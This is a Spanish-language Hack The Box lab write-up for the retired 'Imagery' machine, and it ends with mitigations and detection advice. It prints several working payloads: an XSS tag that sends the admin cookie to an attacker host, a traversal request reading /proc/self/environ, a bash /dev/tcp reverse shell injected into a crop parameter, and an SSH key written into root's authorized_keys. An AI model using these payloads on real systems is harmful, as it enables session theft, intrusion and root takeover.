---
machine: Imagery
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, xss, lfi, command-injection, privesc]
---

# Imagery — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La galería Flask permite enviar «bug reports». El campo `details` se inserta sin `DOMPurify` en el panel de administración, así que un XSS almacenado roba la cookie de sesión del admin, que no tiene `HttpOnly`. Con esa sesión se accede a `/admin/get_system_log`, vulnerable a directory traversal: permite leer el código fuente y `/proc/self/environ`, donde aparece `CRON_BYPASS_TOKEN`. El análisis revela una command injection en `/apply_visual_transform`, pero solo para la cuenta `testuser`; su hash MD5 está en `db.json` y se crackea. La shell es de `web`. Un backup `pyAesCrypt` en `/var/backup` contiene la contraseña de `mark`, y `mark` puede ejecutar `charcol` como root: la opción `fetch` escribe una clave SSH en `/root/.ssh/authorized_keys`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,8000 <IP>
```

- `22` OpenSSH 9.7p1 Ubuntu.
- `8000` Werkzeug/3.1.3, Python 3.12.7, Flask directamente expuesto.

La aplicación permite registrar una cuenta, subir imágenes y enviar un bug report desde el footer. La cookie de sesión es de Flask, sin `HttpOnly`, y decodifica campos como `isAdmin`.

## Enumeración

`feroxbuster` encuentra `/images`, `/upload_image`, `/login`, `/register` y `/logout`. El panel admin carga `/admin/bug_reports` y construye las tarjetas con `innerHTML`; `report.details` no pasa por `DOMPurify`.

Se envía:

```html
<img src=x onerror=fetch('http://<ATTACKER>/?c='+document.cookie)>
```

El administrador revisa los reports periódicamente y la cookie llega al listener. Al decodificarla, `isAdmin` es `true`.

## Foothold

Con la cookie robada se abre el panel de administración. El botón «Download Log» llama a:

```text
/admin/get_system_log?log_identifier=<username>.log
```

El parámetro acepta traversal. Con `curl --path-as-is` se leen `/proc/self/environ`, `app.py` y los módulos `api_*.py`:

```bash
curl --path-as-is -b "session=<COOKIE>" \
  'http://<IP>:8000/admin/get_system_log?log_identifier=../../../../proc/self/environ' \
  --ignore-content-length -s | tr '\000' '\n'
```

El entorno confirma el usuario `web`, el virtualenv y un `CRON_BYPASS_TOKEN`. `api_edit.py` muestra que `/apply_visual_transform` usa `subprocess.run(..., shell=True)` con `width`, `height`, `x` e `y` sin sanear. La ruta exige `session['is_testuser_account']`.

`db.json` contiene hashes MD5 de `admin`, `testuser` y el usuario registrado. El de `testuser` se crackea; se inicia sesión con `testuser@imagery.htb` y se sube una imagen.

## Movimiento lateral

Se envía una petición de transformación «crop» con la inyección en `y`:

```json
{"imageId":"<ID>","transformType":"crop",
 "params":{"x":"0","y":"0; bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'","width":"10","height":"10"}}
```

La shell es de `web`. En `/var/backup` hay un `.zip.aes` de pyAesCrypt 6.1.1; se exfiltra y se crackea con `pyAesBrute` y `rockyou.txt`. El ZIP contiene un `db.json` antiguo con el hash de `mark`; al crackearlo, la contraseña funciona con `su - mark` (SSH tiene `PasswordAuthentication no`).

## Escalada de privilegios

`mark` puede ejecutar `/usr/local/bin/charcol` como root sin contraseña. `charcol -R shell` pide la contraseña de `mark` y resetea la aplicación a modo «sin contraseña». Después, el comando `fetch` descarga una URL y escribe el resultado con propietario root:

```text
charcol> fetch http://<ATTACKER>/id_ed25519.pub -o /root/.ssh/authorized_keys
```

Se entra por SSH con la clave privada:

```bash
ssh -i id_ed25519 root@<IP> -t sh
```

La ruta alternativa es `auto add` para crear un cron que copie `bash` y le ponga setuid.

## Evidencia

- Bug report con `<img onerror>` y cookie del admin recibida.
- Cookie decodificada con `isAdmin: true`.
- `/proc/self/environ` y `api_edit.py` leídos por traversal.
- Petición de crop con `ping`/reverse shell y shell como `web`.
- Backup descifrado y `su - mark`.
- `charcol fetch` escribiendo en `/root/.ssh/authorized_keys` y `id` como root.

## Lecciones aprendidas

- Sanear unos campos y no otros deja un XSS almacenado en el panel administrativo.
- Una cookie sin `HttpOnly` convierte XSS en robo de sesión.
- Un parámetro de nombre de archivo puede ser traversal aunque el endpoint se llame «log».
- El código fuente filtrado revela rutas ocultas y tokens de bypass.
- Una herramienta de backup que escribe como root puede convertirse en escritura arbitraria.

## Mitigaciones y detección

- Sanear `details` en servidor y cliente; usar `textContent` en lugar de `innerHTML`.
- Marcar cookies de sesión como `HttpOnly`, `Secure` y `SameSite`.
- Resolver rutas con `realpath` y limitarlas a un directorio de logs.
- No usar `shell=True`; pasar listas de argumentos y validar números.
- Ejecutar `charcol` sin setuid y restringir `fetch` a destinos allowlisted.
- Detectar peticiones con `../`, XSS en bug reports, `subprocess` con metacaracteres y escrituras en `/root/.ssh`.

## Referencias

- [0xdf — Imagery](https://0xdf.gitlab.io/2026/01/24/htb-imagery.html)
- [IppSec — Imagery](https://www.youtube.com/watch?v=4sMXhZiNjDE)
- [Hack The Box — Imagery](https://app.hackthebox.com/machines/imagery)
